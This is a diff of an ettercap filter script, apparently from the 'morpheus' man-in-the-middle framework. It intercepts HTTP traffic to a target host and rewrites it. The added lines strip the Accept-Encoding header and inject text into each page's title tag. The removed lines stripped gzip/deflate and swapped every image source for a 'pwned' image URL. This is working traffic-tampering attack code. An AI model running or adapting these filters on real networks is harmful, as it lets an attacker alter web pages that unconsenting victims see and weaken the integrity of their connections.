@@ -12,11 +12,10 @@
 
 
 ##
-#  This filter will substitute the html tag '<img src=>'
-#  and injects your image in any webpage requested by TaRONE
+#  This filter will substitute the html tag '<title>'
+#  and injects your text in any webpage requested by TaRONE
 #  Warning: This filter only modifies http traffic..
 ##
-
 
 
 
@@ -25,26 +24,12 @@
 ##########################
 # change target request to server
 if (ip.proto == TCP && tcp.dst == 80) {
-  msg("[morpheus] host:TaRONE   [ -> ]  port:80 HTTP ☆");
+  msg("[morpheus] host:TaRONE   [ ⊶ ]  port:80 HTTP ☆");
     if (search(DATA.data, "Accept-Encoding")) {  
       replace("Accept-Encoding", "Accept-Rubbishe"); # note: replacement string is same length as original string
-      msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ☆");
-      msg("[Morpheus] |_ info : Accept-Encoding zapped from request ✔\n");
+      msg("[Morpheus] | Status: Encoding zapped from response ✔");
     }
 }
-
-if (ip.proto == TCP && tcp.dst == 80) {
-  if (search(DATA.data, "gzip")) {  
-    replace("gzip", "  "); # note: four spaces In the replacement string
-   }  
-}
-
-if (ip.proto == TCP && tcp.dst == 80) {
-  if (search(DATA.data, "deflate")) {
-    replace("deflate", "       "); # note: seven spaces In the replacement string
-  }
-}
-
 
 
 
@@ -53,11 +38,8 @@ if (ip.proto == TCP && tcp.dst == 80) {
 #####################
 # change server response to target
 if (ip.proto == TCP && tcp.src == 80) {
-  msg("[morpheus] host:TaRONE   [ <- ]  port:80 HTTP ☆");
-  replace("img src=", "img src='http://3.bp.blogspot.com/-LYY46BB5FAE/UXhWPEJcokI/AAAAAAAAAKQ/uVGpXjOZusM/s400/pwned+DH.jpg'");  
-  replace("IMG SRC=", "IMG SRC='http://3.bp.blogspot.com/-LYY46BB5FAE/UXhWPEJcokI/AAAAAAAAAKQ/uVGpXjOZusM/s400/pwned+DH.jpg'");
-  msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ☆");
-  msg("[Morpheus] | status: (img) string found in tcp packet ✔");
-  msg("[Morpheus] |_ info : string replaced and forward to target ✔\n");   
-} 
-
+  if (search(DATA.data, "<title>")) {
+    replace("<title>", "<title> Put what you want here");
+    msg("[Morpheus] |_ info : title string replaced and forward to target ✔\n");
+  }
+}
